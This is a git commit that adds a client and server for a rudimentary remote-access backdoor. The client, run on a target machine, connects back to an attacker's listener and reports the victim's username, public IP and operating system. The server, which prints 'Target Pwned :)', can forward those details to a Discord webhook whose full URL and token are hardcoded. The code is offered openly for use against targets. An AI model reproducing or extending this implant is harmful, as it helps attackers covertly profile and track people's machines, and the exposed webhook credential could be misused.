eddf31240096404b6526f53cee8ff055d8ac0ac5
Jake Peach <112898008+4b3j@users.noreply.github.com>
2022-09-25 20:20:53 +0100

    Add files via upload

---
+++ client.py
@@ -0,0 +1,56 @@
+import os
+import requests
+import json
+import platform
+import discord
+from discord.ext import commands
+import socket
+import getpass
+import subprocess
+
+
+in_socket = socket.socket(socket.AF_INET)
+
+user = getpass.getuser()
+
+user_ip = requests.get("https://icanhazip.com").text
+
+theOs     =    platform.system()
+theOsVer  =    platform.version()
+theOsSt   =    theOs + " " + theOsVer
+
+
+SERVER_IP    =  ""
+SERVER_PORT  =  3334
+
+
+def connect_to_server(ip, port):
+    try: 
+        int(port) 
+    except TypeError:
+        print(f"Port should be int not {type(port)}")
+        os._exit(1)
+    in_socket.connect((ip, port))
+    
+
+    while True:
+        cmd = in_socket.recv(1024).decode("UTF-8")
+
+        if cmd == "TEST":
+            in_socket.send(bytes("CONNECTED", "UTF-8"))
+        if cmd == "user":
+            in_socket.send(bytes(f"Username {user}", "UTF-8"))
+        if cmd == "ip":
+            in_socket.send(bytes(f"IP {user_ip}", "UTF-8"))
+        if cmd == "osIn":
+            in_socket.send(bytes(f"Platform {theOsSt}", "UTF-8"))
+        if cmd == "check":
+            in_socket.send(bytes("checked", "UTF-8"))
+        if cmd == "close":
+            in_socket.close()
+            break
+            
+
+
+if __name__ == "__main__":
+    connect_to_server(SERVER_IP, SERVER_PORT)
---
+++ server.py
@@ -0,0 +1,127 @@
+import requests
+import socket
+
+
+s_socket = socket.socket(socket.AF_INET)
+
+
+C_SERVER    =   ""
+C_PORT      =   3334
+
+
+commands = {"help": "Displays information on commands and extras", "user":"Get username of targets machine", "check":"Checks if still connected to target"}
+
+
+o_lo = """
+                                                                                                                                              
+                 bbbbbbbb                                                                                                                     
+       444444444 b::::::b             333333333333333     jjjj         SSSSSSSSSSSSSSS hhhhhhh                                lllllll lllllll 
+      4::::::::4 b::::::b            3:::::::::::::::33  j::::j      SS:::::::::::::::Sh:::::h                                l:::::l l:::::l 
+     4:::::::::4 b::::::b            3::::::33333::::::3  jjjj      S:::::SSSSSS::::::Sh:::::h                                l:::::l l:::::l 
+    4::::44::::4  b:::::b            3333333     3:::::3            S:::::S     SSSSSSSh:::::h                                l:::::l l:::::l 
+   4::::4 4::::4  b:::::bbbbbbbbb                3:::::3jjjjjjj     S:::::S             h::::h hhhhh           eeeeeeeeeeee    l::::l  l::::l 
+  4::::4  4::::4  b::::::::::::::bb              3:::::3j:::::j     S:::::S             h::::hh:::::hhh      ee::::::::::::ee  l::::l  l::::l 
+ 4::::4   4::::4  b::::::::::::::::b     33333333:::::3  j::::j      S::::SSSS          h::::::::::::::hh   e::::::eeeee:::::eel::::l  l::::l 
+4::::444444::::444b:::::bbbbb:::::::b    3:::::::::::3   j::::j       SS::::::SSSSS     h:::::::hhh::::::h e::::::e     e:::::el::::l  l::::l 
+4::::::::::::::::4b:::::b    b::::::b    33333333:::::3  j::::j         SSS::::::::SS   h::::::h   h::::::he:::::::eeeee::::::el::::l  l::::l 
+4444444444:::::444b:::::b     b:::::b            3:::::3 j::::j            SSSSSS::::S  h:::::h     h:::::he:::::::::::::::::e l::::l  l::::l 
+          4::::4  b:::::b     b:::::b            3:::::3 j::::j                 S:::::S h:::::h     h:::::he::::::eeeeeeeeeee  l::::l  l::::l 
+          4::::4  b:::::b     b:::::b            3:::::3 j::::j                 S:::::S h:::::h     h:::::he:::::::e           l::::l  l::::l 
+          4::::4  b:::::bbbbbb::::::b3333333     3:::::3 j::::j     SSSSSSS     S:::::S h:::::h     h:::::he::::::::e         l::::::ll::::::l
+        44::::::44b::::::::::::::::b 3::::::33333::::::3 j::::j     S::::::SSSSSS:::::S h:::::h     h:::::h e::::::::eeeeeeee l::::::ll::::::l
+        4::::::::4b:::::::::::::::b  3:::::::::::::::33  j::::j     S:::::::::::::::SS  h:::::h     h:::::h  ee:::::::::::::e l::::::ll::::::l
+        4444444444bbbbbbbbbbbbbbbb    333333333333333    j::::j      SSSSSSSSSSSSSSS    hhhhhhh     hhhhhhh    eeeeeeeeeeeeee llllllllllllllll
+                                                         j::::j                                                                               
+                                               jjjj      j::::j                                                                               
+                                              j::::jj   j:::::j                                                                               
+                                              j::::::jjj::::::j                                                                               
+                                               jj::::::::::::j                                                                                
+                                                 jjj::::::jjj                                                                                 
+                                                    jjjjjj                                                                          
+"""
+
+
+WEBHOOK = "https://discord.com/api/webhooks/1003802181276803073/B64-bPViJY73BRVzJ817gvfLbrPdNw26WPUxfpzumBge_WhSHoYHRpOrQsrHMURgxX34"
+DISCORD_NOTF = False
+
+
+def d_notify(sen):
+  data = {"content": f"{sen}"}
+  res = requests.post(WEBHOOK, json=data, headers={'Content-Type': 'application/json'})
+  if 200 < res.status_code < 299:
+    print("Sent Response")
+  else:
+    print(res.status_code)
+ 
+
+def on_connect(user, ip, osIn):
+    send_d = f"Connection Success\nFrom {user}\nOn {ip}\nUsing {osIn}"
+    d_notify(send_d)
+
+
+def bind_and_confirm():
+    # Bind server
+    s_socket.bind((C_SERVER, C_PORT))
+    print("Listen for targets now")
+    # Then listen for a connection
+    s_socket.listen()
+
+    # If get a connection accept it 
+    conn, addr = s_socket.accept()
+    print(f"Connection from {addr}")
+
+    # Here it tests if the connection was successful by sending data to target to see if it gets right response that it should
+    conn.send(b"TEST")
+    if conn.recv(1024).decode("UTF-8") == "CONNECTED":
+        print("Target Pwned :)")
+    else:
+        print("TEST FAILED, TRY AGAIN?")
+
+    # Get user on target
+    conn.send(b"user")
+    user = conn.recv(1024).decode("UTF-8")
+    conn.send(b"ip")
+    ip = conn.recv(1024).decode("UTF-8")
+    conn.send(b"osIn")
+    osIn = conn.recv(1024).decode("UTF-8")
+
+    if user.startswith("Username") == False:
+        user = "Username Error"
+    elif ip.startswith("IP") == False:
+        ip = "IP Error"
+    elif osIn.startswith("Platform") == False:
+        osIn = "Platform Error"
+
+    # Send data to webhook to notify server 
+    if DISCORD_NOTF == True:
+        on_connect(user, ip, osIn)
+
+    print("Type help for commands")
+    while True:
+        cmd = input("What command would you like to send? ")
+
+        cmd.replace(" ", "")
+
+        if cmd == "help":
+            the_cmd = f"{commands}"
+            print(the_cmd.replace("{", "").replace("}", "").replace(",", "\n"))
+        if cmd == "user":
+            print(user)
+        if cmd == "check":
+            conn.send(b"check")
+            if conn.recv(1024).decode("UTF-8") == "checked":
+                print(f"{ip} Is Still Connected")
+            else:
+                print("Connection failed, please try connecting again!")
+        if cmd == "close":
+            conn.send(b"close")
+            conn.close()
+            print("Connection Closed https://github.com/4b3j Coded")
+            break
+            
+
+
+if __name__ == "__main__":
+    print(o_lo)
+    print("                                                 Welcome User                ")
+    bind_and_confirm()
